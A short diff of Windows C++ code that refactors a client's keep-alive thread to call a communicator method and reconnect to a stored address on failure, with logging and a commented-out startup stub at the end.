@@ -133,13 +133,11 @@ DWORD WINAPI keepAliveThread(LPVOID pM) {
 	while(true){
 		while (aliveKeeperNeed) {
 			_sleep(1000);
-			while (!send_keepalive_message()){
+			while (!cmtr->send_keep_alive()){
 				_sleep(1000);
-				try {
+				try {//失败重新连接
 					logger->log("[Alive Keeper]KeepAlive failed, resetting connection!");
 					cmtr->connectTillSuccess(cmtr->ip, cmtr->port);
-					/*Communicater *cmtr_cache_old = cmtr;
-					Communicater *cmtr_cache_old = new Communicater();*/
 				}
 				catch(DWORD dwE){
 					std::cout << "rest failed" << std::endl;
@@ -151,9 +149,6 @@ DWORD WINAPI keepAliveThread(LPVOID pM) {
 	return true;
 }
 
-bool send_keepalive_message() {
-	return (bool)cmtr->mySend(headDic.keepAlive);
-}
 /*
 int addToStartUP() {
 	char system[MAX_PATH];
